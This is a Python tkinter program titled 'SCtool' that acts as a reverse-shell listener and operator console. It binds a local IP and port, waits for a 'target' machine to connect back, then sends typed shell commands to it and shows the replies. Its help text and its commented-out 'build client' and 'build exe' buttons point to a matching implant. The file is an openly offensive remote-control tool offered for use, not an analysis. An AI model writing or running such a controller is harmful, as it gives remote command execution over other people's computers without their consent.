import socket
import tkinter as tk
from threading import Thread

global ip_port,conn
global default_Lip,default_Lport,Lip,Lport
default_Lip = '127.0.0.1'
default_Lport = 9999
Lip=''
Lport = 0

global be_con
be_con = 0
global con_flag,start_flag
con_flag = 0
start_flag = 0

class start_thread(Thread):
    def run(self):
        global ip_port,conn
        if (Lip=='')&(Lport==0):
            ip_port = (default_Lip, default_Lport)
        else:
            ip_port = (Lip,Lport)
            show_command.insert('end','Setting Done!\n')
        ready = ("[+] Setting Done!")
        show_command.insert('end',ready+'\n')
        show_command.see('end')
        start_button.config(state = tk.NORMAL)
        global start_flag
        start_flag = 1

class con_thread(Thread):
    def run(self):
        ready = "[+] LHOST IP:"+str(ip_port[0])+'\n'
        ready += "[+] LHOST Port:"+str(ip_port[1])+'\n'
        ready += ("[+] Wating...")
        show_command.insert('end',ready+'\n')
        show_command.see('end')
        global sk,conn,address
        sk = socket.socket()
        sk.bind(ip_port)
        sk.listen(5)
        conn, address = sk.accept()
        global con_flag
        con_flag = 1
        connect_and_start = "[+] Connect\n"
        connect_and_start += "[+] Information:\n"
        connect_and_start += "[+] LHOST IP:"+str(ip_port[0])+'\n'
        connect_and_start += "[+] LHOST Port:"+str(ip_port[1])+'\n'
        connect_and_start += "[+] RHOST IP:"+str(address[0])+'\n'
        connect_and_start += "[+] RHOST Port:"+str(address[1])+'\n'
        connect_and_start += "[+] Can Type Command!"
        show_command.insert('end',connect_and_start + '\n')
        show_command.see('end')
        show_connect_information.insert(1,str(address[0])+' : '+str(address[1]))
        show_connect_information.see('end')
        connect_button.config(state = tk.NORMAL)
        global be_con
        be_con = 1
        
def exe():
    setup(console=['serverUI.py install'])


def reload_button():
    global start_flag,con_flag,be_con,Lip,Lport
    if (con_flag == 0):
        show_command.insert('end',"[X] Not Need reload"+'\n')
    else:
        Lip=''
        Lport=0
        start_flag = 0
        con_flag = 0
        be_con = 0
        reload_con = "echo [+] Command Send Done! && exit"
        conn.send(reload_con.encode())
        conn.close()
        show_command.insert('end',"[X] Connect Close"+'\n')
        show_command.insert('end','reload!\n')
        show_command.see('end')
    

def build():
    show_command.insert('end','\n')

def help_button():
    show_help = "[+] Help:\n\n"
    show_help += "[+] If shell will response somthing can use send command button.\n\n"
    show_help += "[+] If shell will not response somthing ex:open file,call other shell\n"
    show_help += "can use send open file button.\n\n"
    show_help += "[!] If use send command button to open file will crash.\n\n"
    show_help += "[+] Start step:\n\n"
    show_help += "[+] 1.Click set button to set local host IP and Port\n\n"
    show_help += "[+] 2.Click Start to use set IP and Port on mission\n"
    show_help += "If not Set Lhost IP and Port will use Default IP and Port\n\n"
    show_help += "[+] Default IP and Port is 127.0.0.1:9999\n\n"
    show_help += "[+] Click Connect Button to waiting target connect\n\n"
    show_help += "[+] If connect done, can type command and Send command\n\n"
    show_help += "[+] If need reload lhost IP or Port can click reload button\n\n"
    show_help += "[!] Reload Button will disconnect target!\n\n"
    show_help += "\n\n\n\n"
    show_help += "Version: v1.0\n"
    show_command.insert('end',show_help + '\n')
    show_command.see('end')
        
def set_Lip_and_Lport():
    global Lip,Lport
    Lip = type_ip.get()
    Lport = type_port.get()
    if (Lip== '')|(Lport==0):
        Lip = default_Lip
        Lport = default_Lport
        show_command.insert('end','IP and Port not change!\n')
        show_command.see('end')
    else:
        Lip = type_ip.get()
        Lport = type_port.get()
        show_command.insert('end','IP and Port Settng Done!\n')
        show_command.insert('end','Set IP:'+Lip+'\n')
        show_command.insert('end','Set Port:'+Lport+'\n')
        show_command.see('end')


def start():
    if (start_flag == 0)&(be_con == 0):
        start_button.config(state = tk.DISABLED)
        start_thread(daemon = True).start()
    elif start_flag == 1:
        show_command.insert('end','Started\n')
    elif be_con == 1:
        show_command.insert('end','Need reload\n')
    
    
def con():
    if (con_flag == 0)&(be_con == 0)&(start_flag==1):
        connect_button.config(state = tk.DISABLED)
        con_thread(daemon = True).start()
    elif con_flag == 1:
        show_command.insert('end','Need Start\n')
        show_command.see('end')
    elif be_con == 1:
        show_command.insert('end','Need reload')
        show_command.see('end')
    elif start_flag == 0:
        show_command.insert('end','Need Start\n')
        show_command.see('end')

def send_command_fuc():
    if start_flag == 0:
        show_command.insert('end',"Need Start\n")
    elif con_flag == 0:
        show_command.insert('end',"Need Connect\n")
    elif con_flag == 1:
        show_something = enter_command.get()

        for i in range(0,len(show_something)):
            if show_something[i] == '|':
                temp = i
                find_start = 0
                str_start = "start"
                for j in range(4):
                    temp = temp + 1
                    if show_something[temp] == str_start[j]:
                        find_start = find_start + 1
                    if find_start == 5:
                        break
        
        show_command.insert('end',show_something+' command send \n')
        data = "echo [+] Command Send Done! && "+show_something
        if data == "echo [+] Command Send Done! && exit":
            conn.send(data.encode())
            show_command.insert('end',"[X] Connect Close"+'\n')
            show_command.see('end')
            conn.close()
#        elif (data.split(' ')[6] == 'start')|(find_start == 5):
#            conn.send(data.encode())
#            show_command.insert('end','send start!'+'\n')
#            show_command.see('end')
        elif data != '':
            conn.send(data.encode())
#            conn.setblocking(False)
            show_command.insert('end',(conn.recv(4096).decode('big5'))+'\n')
            show_command.insert('end',"[+] Command Request Done!"+'\n')
            show_command.see('end')
        elif data == 'echo [+] Command Send Done! &&':
            show_command.insert('end',"pls enter"+'\n')
            show_command.see('end')
            
def send_command_openfile():
    if start_flag == 0:
        show_command.insert('end',"Need Start\n")
    elif con_flag == 0:
        show_command.insert('end',"Need Connect\n")
    elif con_flag == 1:
        show_something = enter_command.get()
        show_command.insert('end','command send '+show_something+'\n')
        data = show_something
        if data == 'exit':
            conn.send(data.encode())
            show_command.insert('end',"[X] Connect Close"+'\n')
            show_command.see('end')
            conn.close()
        elif data != '':
            conn.send(data.encode())
#            conn.setblocking(False)
            show_command.insert('end','command send done!'+'\n')
            show_command.see('end')
            
        elif data == '':
            show_command.insert('end',"pls enter"+'\n')
            show_command.see('end')

    

window = tk.Tk()
window.geometry('800x500')
window.configure(bg='#000000')
window.title("SCtool- created by hurosu")
command_text = tk.Label(window,text="command:",font = ('Algerian',10),fg='#FFFFFF',bg='#000000').grid(row=1)
enter_command = tk.Entry(window,show = None)
enter_command.grid(row=1,column=1)
enter_command.configure(bg='#303030',fg='#0af000')
command_button = tk.Button(window,text='send command',command=send_command_fuc,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
command_button.grid(row=1,column=2)
start_button = tk.Button(window,text='start',command=start,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
start_button.grid(row=2,column=6)
connect_button = tk.Button(window,text='connect',command=con,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
connect_button.grid(row=3,column=4,sticky='N')
show_command = tk.Text(window,width=60,height=30)
show_command.grid(row=3,column=0,columnspan=3)
show_command.configure(fg='#0af000',bg='#303030')
ip_address = tk.Label(window,text="LHOST IP:",font = ('Algerian',10),fg='#FFFFFF',bg='#000000').grid(row=1,column=4)
open_port = tk.Label(window,text="LHOST PORT:",font = ('Algerian',10),fg='#FFFFFF',bg='#000000').grid(row=2,column=4)
type_ip = tk.Entry(window,show = None)
type_ip.grid(row=1,column=5)
type_ip.configure(fg='#0af000',bg='#303030')
type_port = tk.Entry(window,show = None)
type_port.grid(row=2,column=5)
type_port.configure(fg='#0af000',bg='#303030')
set_ip_port = tk.Button(window,text="Set",command=set_Lip_and_Lport,font = ('微軟正黑體',10),fg='#0af000',bg='#303030').grid(row=1,column=6)
help_button = tk.Button(window,text='help',command=help_button,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
help_button.grid(row=3,column=5)
show_connect_information = tk.Listbox(window)
show_connect_information.grid(row=3,column=4,sticky=tk.S,ipadx=15,ipady=5,columnspan=2,padx=15)
show_connect_information.configure(fg='#0af000',bg='#303030')
#build_button = tk.Button(window,text='build client',command=build,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
#build_button.grid(row=1,column=7,rowspan=2,ipady=5)
reload_button = tk.Button(window,text="reload",command=reload_button,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
reload_button.grid(row=3 ,column=6)
#build_exe = tk.Button(window,text="build exe",command=exe,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
#build_exe.grid(row=3 ,column=7)
#command_button = tk.Button(window,text='sned open file',command=send_command_openfile,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
#command_button.grid(row=2,column=2)

window.mainloop()
